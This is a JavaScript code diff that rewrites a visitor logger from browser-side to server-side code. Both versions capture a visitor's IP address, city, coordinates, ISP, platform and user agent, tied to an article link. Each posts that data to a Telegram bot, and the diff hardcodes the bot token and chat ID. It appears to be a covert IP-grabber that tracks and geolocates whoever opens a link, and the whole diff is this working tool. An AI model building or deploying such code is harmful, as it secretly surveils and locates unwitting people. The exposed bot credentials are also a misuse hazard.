@@ -1,31 +1,30 @@
-async function logVisitor(slug) {
-  try {
-    const res = await fetch("https://ipwho.is/");
-    const data = await res.json();
-    const ua = navigator.userAgent;
+export default async function handler(req, res) {
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const ua = req.headers["user-agent"] || "N/A";
+  const slug = req.query.slug || "неизвестно";
+  const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+  const geo = await geoRes.json().catch(() => ({}));
 
-    const msg = `
-IP: \`\`\`${data.ip}\`\`\`
-Страна: \`\`\`${data.country}\`\`\`
-Город: \`\`\`${data.city}\`\`\`
-Координаты: \`\`\`${data.latitude}, ${data.longitude}\`\`\`
-Провайдер: \`\`\`${data.connection?.isp}\`\`\`
-Локальное время: \`\`\`${data.timezone?.current_time}\`\`\`
-Платформа: \`\`\`${navigator.platform}\`\`\`
-UA: \`\`\`${ua}\`\`\`
-Ссылка на статью: \`\`\`${slug}\`\`\`
-`;
+  const message = `
+🔗 Ссылка: ${slug}
+🌍 IP: \`${ip}\`
+📍 Страна: ${geo.country_name || "?"}
+🏙️ Город: ${geo.city || "?"}
+🧭 Координаты: ${geo.latitude || "?"}, ${geo.longitude || "?"}
+🌐 Провайдер: ${geo.org || "?"}
+🕰️ Локальное время: \`${geo.utc_offset || "?"}\`
+💻 Платформа: \`${ua.includes("Windows") ? "Windows" : ua.includes("Android") ? "Android" : "Другая"}\`
+🧾 UA: \`${ua}\`
+`.trim();
 
-    await fetch("https://api.telegram.org/bot7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY/sendMessage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: 2079893058,
-        text: msg,
-        parse_mode: "Markdown"
-      })
-    });
-  } catch (err) {
-    console.error("Логгер не сработал", err);
-  }
+  const token = "7329999473:AAEglilZMhtE6Iyr_uhLLRlI-32cIROEmNY";
+  const chatId = "2079893058";
+
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" }),
+  });
+
+  res.status(200).json({ ok: true });
 }
